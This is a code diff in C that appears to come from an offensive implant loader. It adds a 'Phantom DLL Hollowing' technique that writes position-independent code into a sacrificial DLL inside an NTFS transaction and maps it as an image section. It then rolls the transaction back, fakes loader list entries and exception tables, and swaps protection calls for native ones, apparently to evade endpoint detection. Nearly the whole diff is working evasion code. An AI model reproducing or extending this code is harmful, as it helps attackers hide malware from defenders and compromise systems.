@@ -2,11 +2,17 @@
 
 static PSP_PEB _sp_get_peb(void) {
     PSP_PEB peb;
+#ifdef _M_X64
     __asm__ volatile ("movq %%gs:0x60, %0" : "=r" (peb));
+#elif defined(_M_IX86)
+    __asm__ volatile ("movl %%fs:0x30, %0" : "=r" (peb));
+#else
+#error Unsupported architecture
+#endif
     return peb;
 }
 
-#if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1
+#if defined(STOMP_TECHNIQUE) && (STOMP_TECHNIQUE == 1 || STOMP_TECHNIQUE == 2)
 
 static SIZE_T _sp_wstrlen(const WCHAR* s) {
     SIZE_T n = 0;
@@ -185,6 +191,8 @@ static VOID _sp_insert_fake_ldr_entry(PVOID viewBase, const char* dllName)
                entry->TimeDateStamp, entry->DdagNode);
 }
 
+#if STOMP_TECHNIQUE == 1
+
 static BOOL StompPICONtSection( PICO_ARGS picoArgs ) {
     DWORD oldProt = 0;
 
@@ -260,7 +268,8 @@ static BOOL StompPICONtSection( PICO_ARGS picoArgs ) {
     rfTable[0].UnwindData     = picoCodeSize;
 
     DWORD coverSize = picoCodeSize + 4;
-    KERNEL32$VirtualProtect(code, coverSize, PAGE_EXECUTE_READ, &oldProt);
+    SIZE_T regionSize = (SIZE_T)coverSize;
+    NTDLL$NtProtectVirtualMemory((HANDLE)(LONG_PTR)-1, (PVOID*)&code, &regionSize, PAGE_EXECUTE_READ, &oldProt);
     KERNEL32$RtlDeleteFunctionTable((PRUNTIME_FUNCTION)viewBase);
     KERNEL32$RtlAddFunctionTable(rfTable, 1, (DWORD64)code);
     return TRUE;
@@ -325,6 +334,381 @@ static BOOL StompDLLNtSection( DLL_ARGS dllArgs ) {
 
 #endif /* STOMP_TECHNIQUE == 1 */
 
+#if STOMP_TECHNIQUE == 2
+
+DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void*, const void*, size_t);
+
+static BOOL _sp_read_file_to_buffer(const char* dllName, BYTE** ppBuf, ULONG* pFileSize) {
+    WCHAR ntPath[512];
+    _sp_build_nt_path(dllName, ntPath, 512);
+
+    SP_UNICODE_STRING uPath;
+    uPath.Buffer        = ntPath;
+    uPath.Length        = (USHORT)(_sp_wstrlen(ntPath) * sizeof(WCHAR));
+    uPath.MaximumLength = uPath.Length + sizeof(WCHAR);
+
+    SP_OBJECT_ATTRIBUTES objAttr;
+    SP_INIT_OBJ_ATTR(objAttr, &uPath, SP_OBJ_CASE_INSENSITIVE);
+
+    SP_IO_STATUS_BLOCK ioStatus = { 0 };
+    HANDLE hFile = NULL;
+
+    NTSTATUS status = NTDLL$NtOpenFile(
+        &hFile,
+        SYNCHRONIZE | FILE_READ_DATA | FILE_READ_ATTRIBUTES,
+        &objAttr, &ioStatus,
+        FILE_SHARE_READ | FILE_SHARE_DELETE,
+        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
+    );
+    if (!SP_NT_SUCCESS(status) || !hFile) {
+        StealthDbg("ERROR: _sp_read_file: NtOpenFile failed for '%s': 0x%08X\n", dllName, (unsigned)status);
+        return FALSE;
+    }
+
+    SP_FILE_STANDARD_INFORMATION fileInfo = { 0 };
+    SP_IO_STATUS_BLOCK ioInfo = { 0 };
+    status = NTDLL$NtQueryInformationFile(hFile, &ioInfo, &fileInfo, sizeof(fileInfo), SP_FileStandardInformation);
+    if (!SP_NT_SUCCESS(status)) {
+        StealthDbg("ERROR: _sp_read_file: NtQueryInformationFile failed: 0x%08X\n", (unsigned)status);
+        NTDLL$NtClose(hFile);
+        return FALSE;
+    }
+
+    ULONG fileSize = (ULONG)fileInfo.EndOfFile.QuadPart;
+    BYTE* buf = (BYTE*)KERNEL32$VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!buf) {
+        StealthDbg("ERROR: _sp_read_file: VirtualAlloc(%u) failed\n", fileSize);
+        NTDLL$NtClose(hFile);
+        return FALSE;
+    }
+
+    SP_IO_STATUS_BLOCK ioRead = { 0 };
+    status = NTDLL$NtReadFile(hFile, NULL, NULL, NULL, &ioRead, buf, fileSize, NULL, NULL);
+    NTDLL$NtClose(hFile);
+
+    if (!SP_NT_SUCCESS(status)) {
+        StealthDbg("ERROR: _sp_read_file: NtReadFile failed: 0x%08X\n", (unsigned)status);
+        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    *ppBuf     = buf;
+    *pFileSize = fileSize;
+    StealthDbg("Phantom: read '%s' into buffer (%u bytes)\n", dllName, fileSize);
+    return TRUE;
+}
+
+
+static void _sp_build_temp_nt_path(const char* dllName, WCHAR* ntPath, int maxChars) {
+    static const WCHAR prefix[] = L"\\??\\";
+    WCHAR tempDir[MAX_PATH];
+
+    DWORD tempDirLen = KERNEL32$GetTempPathW(MAX_PATH, tempDir);
+    /* GetTempPathW always appends a backslash; strip it so we add our own */
+    if (tempDirLen > 0 && tempDir[tempDirLen - 1] == L'\\')
+        tempDir[--tempDirLen] = L'\0';
+
+    int pos = 0;
+    for (int i = 0; prefix[i] && pos < maxChars - 1; i++) ntPath[pos++] = prefix[i];
+    for (int i = 0; tempDir[i] && pos < maxChars - 1; i++) ntPath[pos++] = tempDir[i];
+    if (pos < maxChars - 1) ntPath[pos++] = L'\\';
+    for (int i = 0; dllName[i] && pos < maxChars - 1; i++) ntPath[pos++] = (WCHAR)(unsigned char)dllName[i];
+    ntPath[pos] = L'\0';
+}
+
+static BOOL _sp_map_image_phantom(const char* dllName, BYTE* fileBuf, ULONG fileSize,
+                                   PVOID* pViewBase, SIZE_T* pViewSize) {
+    WCHAR ntPath[512];
+    _sp_build_temp_nt_path(dllName, ntPath, 512);
+
+    /* 1. Create NTFS transaction */
+    HANDLE hTxn = NULL;
+    SP_OBJECT_ATTRIBUTES txnAttr;
+    SP_INIT_OBJ_ATTR(txnAttr, NULL, 0);
+
+    NTSTATUS status = NTDLL$NtCreateTransaction(
+        &hTxn, TRANSACTION_ALL_ACCESS, &txnAttr,
+        NULL, NULL, 0, 0, 0, NULL, NULL
+    );
+    if (!SP_NT_SUCCESS(status) || !hTxn) {
+        StealthDbg("ERROR: NtCreateTransaction failed: 0x%08X\n", (unsigned)status);
+        return FALSE;
+    }
+    StealthDbg("Phantom: transaction created: %p\n", hTxn);
+
+    NTDLL$RtlSetCurrentTransaction(hTxn);
+
+    SP_UNICODE_STRING uPath;
+    uPath.Buffer        = ntPath;
+    uPath.Length        = (USHORT)(_sp_wstrlen(ntPath) * sizeof(WCHAR));
+    uPath.MaximumLength = uPath.Length + sizeof(WCHAR);
+
+    SP_OBJECT_ATTRIBUTES objAttr;
+    SP_INIT_OBJ_ATTR(objAttr, &uPath, SP_OBJ_CASE_INSENSITIVE);
+
+    SP_IO_STATUS_BLOCK ioStatus = { 0 };
+    HANDLE hTxnFile = NULL;
+
+    status = NTDLL$NtCreateFile(
+        &hTxnFile,
+        GENERIC_WRITE | GENERIC_READ | SYNCHRONIZE,
+        &objAttr, &ioStatus,
+        NULL,
+        FILE_ATTRIBUTE_NORMAL,
+        0,
+        FILE_SUPERSEDE,
+        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+        NULL, 0
+    );
+
+    NTDLL$RtlSetCurrentTransaction(NULL);
+
+    if (!SP_NT_SUCCESS(status) || !hTxnFile) {
+        StealthDbg("ERROR: NtCreateFile (transacted) failed: 0x%08X\n", (unsigned)status);
+        NTDLL$NtClose(hTxn);
+        return FALSE;
+    }
+    StealthDbg("Phantom: opened transacted file handle: %p\n", hTxnFile);
+
+    /* 3. Write the modified buffer to the transacted file */
+    SP_IO_STATUS_BLOCK ioWrite = { 0 };
+    status = NTDLL$NtWriteFile(hTxnFile, NULL, NULL, NULL, &ioWrite, fileBuf, fileSize, NULL, NULL);
+    if (!SP_NT_SUCCESS(status)) {
+        StealthDbg("ERROR: NtWriteFile (transacted) failed: 0x%08X\n", (unsigned)status);
+        NTDLL$NtClose(hTxnFile);
+        NTDLL$NtClose(hTxn);
+        return FALSE;
+    }
+    StealthDbg("Phantom: wrote %u bytes to transacted file\n", fileSize);
+
+    /* 4. Create SEC_IMAGE section from the transacted file */
+    HANDLE hSection = NULL;
+    status = NTDLL$NtCreateSection(
+        &hSection,
+        SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
+        NULL, NULL,
+        PAGE_READONLY,
+        SEC_IMAGE,
+        hTxnFile
+    );
+    NTDLL$NtClose(hTxnFile);
+
+    if (!SP_NT_SUCCESS(status) || !hSection) {
+        StealthDbg("ERROR: NtCreateSection (phantom) failed: 0x%08X\n", (unsigned)status);
+        NTDLL$NtRollbackTransaction(hTxn, TRUE);
+        NTDLL$NtClose(hTxn);
+        return FALSE;
+    }
+
+    /* 5. Map the section */
+    PVOID  viewBase = NULL;
+    SIZE_T viewSize = 0;
+    status = NTDLL$NtMapViewOfSection(
+        hSection,
+        (HANDLE)(LONG_PTR)-1,
+        &viewBase, 0, 0,
+        NULL, &viewSize,
+        SP_VIEW_SHARE, 0,
+        PAGE_READONLY
+    );
+    NTDLL$NtClose(hSection);
+
+    if (!SP_NT_SUCCESS(status) || !viewBase) {
+        StealthDbg("ERROR: NtMapViewOfSection (phantom) failed: 0x%08X\n", (unsigned)status);
+        NTDLL$NtRollbackTransaction(hTxn, TRUE);
+        NTDLL$NtClose(hTxn);
+        return FALSE;
+    }
+
+    /* 6. Rollback the transaction - on-disk file is unchanged */
+    NTDLL$NtRollbackTransaction(hTxn, TRUE);
+    NTDLL$NtClose(hTxn);
+    StealthDbg("Phantom: transaction rolled back, view at %p (0x%zX bytes) - SharedOriginal intact\n",
+               viewBase, viewSize);
+
+    *pViewBase = viewBase;
+    *pViewSize = viewSize;
+    return TRUE;
+}
+
+static BOOL StompPICOPhantom( PICO_ARGS picoArgs ) {
+    /* 1. Read the sacrificial DLL from disk into a temp buffer */
+    BYTE*  fileBuf  = NULL;
+    ULONG  fileSize = 0;
+    if (!_sp_read_file_to_buffer(picoArgs.sacrificialDll, &fileBuf, &fileSize)) {
+        return FALSE;
+    }
+
+    /* 2. Parse PE in the raw file buffer and find .text section */
+    PIMAGE_DOS_HEADER     pDos     = (PIMAGE_DOS_HEADER)fileBuf;
+    PIMAGE_NT_HEADERS     pNt      = (PIMAGE_NT_HEADERS)(fileBuf + pDos->e_lfanew);
+    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
+
+    DWORD textRawOffset = 0;
+    DWORD textRawSize   = 0;
+    DWORD textVA        = 0;
+
+    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        if ((*(DWORD*)pSection->Name | 0x20202020) == 'xet.') {
+            textRawOffset = pSection->PointerToRawData;
+            textRawSize   = pSection->SizeOfRawData;
+            textVA        = pSection->VirtualAddress;
+            StealthDbg("Phantom PICO: .text raw=0x%X size=0x%X VA=0x%X\n", textRawOffset, textRawSize, textVA);
+            break;
+        }
+        pSection++;
+    }
+
+    if (!textRawOffset || !textRawSize) {
+        StealthDbg("ERROR: Phantom PICO: .text section not found in raw file\n");
+        KERNEL32$VirtualFree(fileBuf, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    PICO* tmpPico = (PICO*)(fileBuf + textRawOffset);
+    char* bufCode = tmpPico->code;
+    char* bufData = tmpPico->data;
+    PicoLoad(picoArgs.funcs, picoArgs.pico_src, bufCode, bufData);
+    StealthDbg("Phantom PICO: PicoLoad wrote to file buffer at offset 0x%X\n", textRawOffset);
+
+    /* 4. Zero out the .pdata (exception directory) in the raw file */
+    {
+        PIMAGE_DATA_DIRECTORY excDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+        if (excDir->VirtualAddress && excDir->Size) {
+            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(pNt);
+            for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, sec++) {
+                if (sec->VirtualAddress == excDir->VirtualAddress) {
+                    MSVCRT$memset(fileBuf + sec->PointerToRawData, 0, sec->SizeOfRawData);
+                    StealthDbg("Phantom PICO: zeroed .pdata in raw file at offset 0x%X\n", sec->PointerToRawData);
+                    break;
+                }
+            }
+            excDir->VirtualAddress = 0;
+            excDir->Size           = 0;
+        }
+    }
+
+    /* 5. Create transacted section and map it */
+    PVOID  viewBase = NULL;
+    SIZE_T viewSize = 0;
+    if (!_sp_map_image_phantom(picoArgs.sacrificialDll, fileBuf, fileSize, &viewBase, &viewSize)) {
+        KERNEL32$VirtualFree(fileBuf, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    KERNEL32$VirtualFree(fileBuf, 0, MEM_RELEASE);
+
+    *(picoArgs.pico_dst) = (PICO*)((ULONG_PTR)viewBase + textVA);
+
+    {
+        DWORD dataProt = 0;
+        KERNEL32$VirtualProtect((*(picoArgs.pico_dst))->data, sizeof((*(picoArgs.pico_dst))->data), PAGE_READWRITE, &dataProt);
+        StealthDbg("Phantom PICO: data region at %p made writable (code pages unchanged)\n", (*(picoArgs.pico_dst))->data);
+    }
+
+
+    {
+        char* mapCode = (*(picoArgs.pico_dst))->code;
+        char* mapData = (*(picoArgs.pico_dst))->data;
+        LONGLONG delta = (LONGLONG)((ULONG_PTR)mapCode - (ULONG_PTR)bufCode);
+        StealthDbg("Phantom PICO: fixup delta = 0x%llX (buf=%p map=%p)\n", (unsigned long long)delta, bufCode, mapCode);
+
+        if (delta != 0) {
+            unsigned char* meta = (unsigned char*)picoArgs.pico_src + 0x10;
+            int codePatches = 0;
+            int dataPatches = 0;
+            while (*meta) {
+                unsigned char type = meta[0];
+                unsigned char sub  = meta[1];
+
+                if (type == 1) {
+                    int offset = *(int*)(meta + 4);
+                    if (sub == 2 || sub == 3) {
+                        /* Data-section patch - safe to fix (data page is writable) */
+                        *(ULONGLONG*)(mapData + offset) += delta;
+                        dataPatches++;
+                    } else if (sub == 0 || sub == 1) {
+                        /* Code-section patch - would need to write to code page.
+                         * Make code page temporarily writable, fix, restore. */
+                        DWORD tmpProt = 0;
+                        KERNEL32$VirtualProtect(mapCode + offset, sizeof(ULONGLONG), PAGE_READWRITE, &tmpProt);
+                        *(ULONGLONG*)(mapCode + offset) += delta;
+                        KERNEL32$VirtualProtect(mapCode + offset, sizeof(ULONGLONG), tmpProt, &tmpProt);
+                        codePatches++;
+                    }
+                }
+
+                short nextOff = *(short*)(meta + 2);
+                if (nextOff <= 0) break;
+                meta += nextOff;
+            }
+            StealthDbg("Phantom PICO: fixup applied: %d data patches, %d code patches\n", dataPatches, codePatches);
+            if (codePatches > 0) {
+                StealthDbg("WARN: Phantom PICO: %d code-section patches may affect SharedOriginal on those pages\n", codePatches);
+            }
+        }
+    }
+
+    /* 7. Insert fake LDR entry */
+    _sp_insert_fake_ldr_entry(viewBase, picoArgs.sacrificialDll);
+
+    /* 8. Register exception handlers */
+    DWORD picoCodeSize = (DWORD)PicoCodeSize(picoArgs.pico_src);
+    unsigned char* code = (unsigned char*)(*(picoArgs.pico_dst))->code;
+
+    RUNTIME_FUNCTION* rfTable = picoArgs.pico_rf_storage;
+    rfTable[0].BeginAddress = 0;
+    rfTable[0].EndAddress   = picoCodeSize;
+    rfTable[0].UnwindData   = picoCodeSize;
+
+    KERNEL32$RtlDeleteFunctionTable((PRUNTIME_FUNCTION)viewBase);
+    KERNEL32$RtlAddFunctionTable(rfTable, 1, (DWORD64)code);
+
+    StealthDbg("Phantom PICO: done - code at %p, SharedOriginal pages\n", code);
+    return TRUE;
+}
+
+static BOOL StompDLLPhantom( DLL_ARGS dllArgs ) {
+
+
+    PVOID  viewBase = NULL;
+    SIZE_T viewSize = 0;
+
+    if (!_sp_map_image(dllArgs.sacrificialDll, &viewBase, &viewSize)) {
+        return FALSE;
+    }
+
+    *(dllArgs.dll_dst) = (char*)viewBase;
+
+    _sp_insert_fake_ldr_entry(viewBase, dllArgs.sacrificialDll);
+
+    PIMAGE_DOS_HEADER vDos = (PIMAGE_DOS_HEADER)viewBase;
+    PIMAGE_NT_HEADERS vNt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + vDos->e_lfanew);
+    DWORD imageSize = vNt->OptionalHeader.SizeOfImage;
+
+    DWORD oldProt = 0;
+    //KERNEL32$VirtualProtect(viewBase, imageSize, PAGE_READWRITE, &oldProt);
+    for (DWORD offset = 0; offset < imageSize; offset += 0x900) {
+        DWORD chunkSize = (offset + 0x900 <= imageSize) ? 0x900 : (imageSize - offset);
+        DWORD chunkProt = 0;
+        BOOL vpRet = KERNEL32$VirtualProtect((PVOID)((ULONG_PTR)viewBase + offset), chunkSize, PAGE_READWRITE, &chunkProt);
+    }
+
+    MSVCRT$memset(viewBase, 0, imageSize);
+
+    StealthDbg("Phantom DLL: SEC_IMAGE mapped '%s' at %p (0x%X bytes), stomping agent\n", dllArgs.sacrificialDll, viewBase, imageSize);
+
+    LoadDLL(dllArgs.dll_data, *(dllArgs.dll_src), *(dllArgs.dll_dst));
+    ProcessImports(dllArgs.funcs, dllArgs.dll_data, *(dllArgs.dll_dst));
+
+    StealthDbg("Phantom DLL: LoadDLL + ProcessImports done\n");
+    return TRUE;
+}
+
+#endif /* STOMP_TECHNIQUE == 2 */
+
+#endif /* STOMP_TECHNIQUE == 1 || 2 */
+
 static void _sp_patch_ldr_entry(PVOID moduleBase) {
     PSP_PEB pPeb = _sp_get_peb();
     if (!pPeb || !pPeb->Ldr) return;
@@ -337,19 +721,16 @@ static void _sp_patch_ldr_entry(PVOID moduleBase) {
     PSP_LIST_ENTRY cur     = head->Flink;
 
     while (cur != head) {
-        PSP_LDR_DATA_TABLE_ENTRY entry =
-            (PSP_LDR_DATA_TABLE_ENTRY)cur;
+        PSP_LDR_DATA_TABLE_ENTRY entry = (PSP_LDR_DATA_TABLE_ENTRY)cur;
 
         if (entry->DllBase == moduleBase) {
             /* Restore EntryPoint from the PE header */
-            entry->EntryPoint = (PVOID)((ULONG_PTR)moduleBase +
-                                        nt->OptionalHeader.AddressOfEntryPoint);
+            entry->EntryPoint = (PVOID)((ULONG_PTR)moduleBase + nt->OptionalHeader.AddressOfEntryPoint);
 
             /* Set LDRP_IMAGE_DLL | LDRP_ENTRY_PROCESSED */
             entry->Flags |= SP_LDRP_IMAGE_DLL | SP_LDRP_ENTRY_PROCESSED;
 
-            StealthDbg("_sp_patch_ldr_entry: patched DllBase=%p EntryPoint=%p Flags=0x%X\n",
-                       moduleBase, entry->EntryPoint, entry->Flags);
+            StealthDbg("_sp_patch_ldr_entry: patched DllBase=%p EntryPoint=%p Flags=0x%X\n", moduleBase, entry->EntryPoint, entry->Flags);
             return;
         }
         cur = cur->Flink;
@@ -358,7 +739,10 @@ static void _sp_patch_ldr_entry(PVOID moduleBase) {
 }
 
 static BOOL StompPICO( PICO_ARGS picoArgs ) {
-#if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1
+#if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 2
+    StealthDbg("StompPICO: using Phantom DLL Hollowing (NTFS Transaction) technique\n");
+    return StompPICOPhantom(picoArgs);
+#elif defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1
     StealthDbg("StompPICO: using NtCreateSection + NtMapViewOfSection technique\n");
     return StompPICONtSection(picoArgs);
 #else
@@ -399,7 +783,8 @@ static BOOL StompPICO( PICO_ARGS picoArgs ) {
 
     *(picoArgs.pico_dst) = (PICO*)pTextSection;
 
-    KERNEL32$VirtualProtect(pTextSection, textSize, PAGE_READWRITE, &oldProt);
+    SIZE_T regionSize = (SIZE_T)textSize;
+    NTDLL$NtProtectVirtualMemory((HANDLE)(LONG_PTR)-1, (PVOID*)&pTextSection, &regionSize, PAGE_READWRITE, &oldProt);
 
     PicoLoad(picoArgs.funcs, picoArgs.pico_src, (*picoArgs.pico_dst)->code, (*picoArgs.pico_dst)->data);
 
@@ -418,7 +803,13 @@ static BOOL StompPICO( PICO_ARGS picoArgs ) {
     rfTable[0].UnwindData     = picoCodeSize;
 
     DWORD coverSize = picoCodeSize + 4;
-    KERNEL32$VirtualProtect(code, coverSize, PAGE_EXECUTE_READ, &oldProt);
+    regionSize = (SIZE_T)coverSize;
+    NTDLL$NtProtectVirtualMemory((HANDLE)(LONG_PTR)-1, (PVOID*)&code, &regionSize, PAGE_EXECUTE_READ, &oldProt);
+
+    KERNEL32$FlushInstructionCache((HANDLE)(LONG_PTR)-1, code, (SIZE_T)coverSize);
+
+    StealthDbg("VirtualProtect(code, 0x%X, PAGE_EXECUTE_READ, 0x%X)\n", coverSize, oldProt);
+
     KERNEL32$RtlDeleteFunctionTable((PRUNTIME_FUNCTION)hModule);
     KERNEL32$RtlAddFunctionTable(rfTable, 1, (DWORD64)code);
     return TRUE;
@@ -426,7 +817,10 @@ static BOOL StompPICO( PICO_ARGS picoArgs ) {
 }
 
 static BOOL StompDLL( DLL_ARGS dllArgs ) {
-#if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1
+#if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 2
+    StealthDbg("StompDLL: using Phantom DLL Hollowing (NTFS Transaction) technique\n");
+    return StompDLLPhantom(dllArgs);
+#elif defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1
     StealthDbg("StompDLL: using NtCreateSection + NtMapViewOfSection technique\n");
     return StompDLLNtSection(dllArgs);
 #else
@@ -440,13 +834,22 @@ static BOOL StompDLL( DLL_ARGS dllArgs ) {
 
     _sp_patch_ldr_entry((PVOID)*(dllArgs.dll_dst));
 
-    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)*(dllArgs.dll_dst);
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(*(dllArgs.dll_dst));
     PIMAGE_NT_HEADERS pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)*(dllArgs.dll_dst) + pDosHeader->e_lfanew);
     DWORD dllSize = pNtHeader->OptionalHeader.SizeOfImage;
-    KERNEL32$VirtualProtect(*(dllArgs.dll_dst), dllSize, PAGE_READWRITE, &oldProt);
+    StealthDbg("loaded sacrificial DLL '%s' at %p with SizeOfImage=0x%X\n", dllArgs.sacrificialDll, *(dllArgs.dll_dst), dllSize);   
+
+    for (DWORD offset = 0; offset < dllSize; offset += 0x900) {
+        DWORD chunkSize = (offset + 0x900 <= dllSize) ? 0x900 : (dllSize - offset);
+        DWORD chunkProt = 0;
+        BOOL vpRet = KERNEL32$VirtualProtect((PVOID)((ULONG_PTR)*(dllArgs.dll_dst) + offset), chunkSize, PAGE_READWRITE, &chunkProt);
+    }
+
     MSVCRT$memset(*(dllArgs.dll_dst), 0, dllSize);
+    
     LoadDLL(dllArgs.dll_data, *(dllArgs.dll_src), *(dllArgs.dll_dst));
     ProcessImports(dllArgs.funcs, dllArgs.dll_data, *(dllArgs.dll_dst));
+
     return TRUE;
 #endif
 }
